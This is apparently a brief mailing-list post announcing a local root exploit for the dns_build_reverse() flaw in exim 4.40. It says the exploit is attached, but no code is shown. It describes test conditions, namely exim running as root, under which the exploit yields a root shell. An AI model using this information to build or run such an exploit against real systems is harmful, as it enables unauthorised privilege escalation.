Subject: exim 4.40 exploit

hello punters,

i was bored last night so I coded up a local exploit of the
dns_build_reverse() vulnerability in exim 4.40. hope noone
minds as it was disclosed 5 months ago.
tested on exim 4.40 default build with runtime user as root
rather than exim or mail - hence the rootshell. see below
for versions and system details. "exploit" attached.

regards
plug
